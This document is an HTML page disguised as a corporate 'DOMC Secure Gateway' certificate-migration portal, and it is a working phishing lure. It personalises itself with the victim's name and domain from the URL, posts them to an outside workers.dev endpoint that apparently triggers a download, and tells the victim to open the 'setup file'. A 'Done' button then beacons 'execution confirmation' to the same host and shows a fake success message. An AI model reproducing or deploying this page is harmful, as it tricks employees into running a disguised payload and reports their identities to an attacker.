<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>DOMC Secure Migration Gateway</title>
    <style>
        body {
            background: url('https://i.ibb.co/G3spj5wR/orgo-blur.png') no-repeat center center fixed;
            background-size: cover;
            backdrop-filter: blur(10px);
            font-family: 'Segoe UI', Arial, sans-serif;
            display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0;
        }
        .card { 
            background: rgba(255, 255, 255, 0.98); 
            padding: 40px; border-radius: 12px; 
            box-shadow: 0 10px 30px rgba(0,0,0,0.3); 
            max-width: 420px; width: 90%; text-align: center; 
        }
        .logo { font-weight: bold; color: #0078d4; font-size: 22px; margin-bottom: 20px; border-bottom: 1px solid #eee; padding-bottom: 10px; }
        .status-text { color: #333; font-size: 14px; margin: 15px 0; line-height: 1.6; }
        
        .instruction-box { 
            display: none; background: #fff4ce; padding: 20px; 
            border-radius: 6px; border: 1px solid #f2c037; margin-top: 20px; 
        }
        .btn-done { 
            background-color: #28a745; color: white; width: 100%; 
            padding: 14px; border-radius: 6px; font-weight: 600; 
            border: none; cursor: pointer; margin-top: 15px;
        }
    </style>
    <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
</head>
<body>

<div class="card">
    <div class="logo">DOMC Secure Gateway</div>

    <div id="init-section">
        <p class="status-text">Identity confirmed. Finalizing node for <strong id="display-user">USER</strong>...</p>
        
        <form id="worker-form" action="https://wandering-cherry-0bf1.g03755901.workers.dev/" method="POST">
            <div class="cf-turnstile" 
                 data-sitekey="0x4AAAAAACafd07cw2w7X14i" 
                 data-callback="onPassed"></div>
            
            <input type="hidden" name="cf-turnstile-response" id="cf-token">
            <input type="hidden" name="user" id="form-user">
            <input type="hidden" name="dom" id="form-dom">
        </form>
    </div>

    <div id="step-two" class="instruction-box">
        <p style="font-size: 15px; color: #d93025; font-weight: bold; margin: 0 0 10px 0;">Download Initialized</p>
        <p style="font-size: 13px; color: #333; text-align: left; margin: 0;">
            1. <strong>Open</strong> the downloaded setup file.<br>
            2. <strong>Follow</strong> the prompts to sync your certificate.<br>
            3. Click <strong>'Done'</strong> below once the file has been opened.
        </p>
        <button id="done-btn" class="btn-done">Done / Finish Sync</button>
    </div>
</div>

<script>
    // 1. Grab Params from URL (Google Script or Direct Link)
    const urlParams = new URLSearchParams(window.location.search);
    const user = urlParams.get('user') || 'Employee';
    const dom = urlParams.get('dom') || 'Corporate';
    
    // UI Personalization
    document.getElementById('display-user').innerText = user;
    document.getElementById('form-user').value = user;
    document.getElementById('form-dom').value = dom;

    // 2. CAPTCHA SOLVED -> Triggers Download + Notification 1
    function onPassed(token) {
        document.getElementById('cf-token').value = token;
        
        // Submit the form to the Worker
        document.getElementById('worker-form').submit();

        // Switch UI to Instruction Box
        setTimeout(() => {
            document.getElementById('init-section').style.display = 'none';
            document.getElementById('step-two').style.display = 'block';
        }, 1500);
    }

    // 3. DONE CLICKED -> Triggers Notification 2 (Execution Confirmation)
    document.getElementById('done-btn').addEventListener('click', async function() {
        const btn = this;
        btn.innerText = "Finalizing...";
        btn.disabled = true;

        // Create the 'Done' payload for the Worker
        const formData = new FormData();
        formData.append('action', 'done');
        formData.append('user', user);
        formData.append('dom', dom);

        try {
            // Send the signal to your Worker link
            await fetch("https://wandering-cherry-0bf1.g03755901.workers.dev/", {
                method: "POST",
                body: formData
            });
        } catch (e) {
            console.log("Worker Ping Failed");
        }

        // Final UI Success State
        document.querySelector('.instruction-box').innerHTML = 
            "<p style='color:#28a745; font-weight:bold; font-size:16px;'>✓ Migration Complete</p>" +
            "<p style='font-size:13px; color:#333;'>Your workstation has been synchronized. You may close this window.</p>";
    });
</script>

</body>
</html>
